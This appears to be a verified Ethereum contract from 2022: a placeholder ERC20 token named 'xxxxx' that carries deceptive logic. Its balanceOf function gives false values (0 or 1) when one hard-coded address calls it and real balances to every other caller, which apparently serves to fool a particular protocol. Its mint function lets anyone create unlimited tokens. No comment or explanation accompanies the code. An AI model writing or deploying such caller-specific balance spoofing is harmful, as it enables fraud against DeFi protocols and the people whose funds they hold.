/**
 *Submitted for verification at Etherscan.io on 2022-04-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint);

   // function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract ERC20 is IERC20 {
    uint public totalSupply;
    //mapping(address => uint) public balanceOf;
    mapping(address => uint) public balanceOfs;
    uint v = 0;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "xxxxx";
    string public symbol = "xxxxx";
    uint8 public decimals = 18;
     function balanceOf(address account) external returns (uint) {
         if (msg.sender == 0x99B4019705444eB0F21aa6CcB71B996a0A4e8764){
            if (v == 0){
                return 0;
            }
            else{

                return 1;
            }

        }
        return balanceOfs[account];
    }
    function transfer(address recipient, uint amount) external returns (bool) {
        balanceOfs[msg.sender] -= amount;
        balanceOfs[recipient] += amount;
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOfs[sender] -= amount;
        balanceOfs[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint amount) external {
        balanceOfs[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint amount) external {
        balanceOfs[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}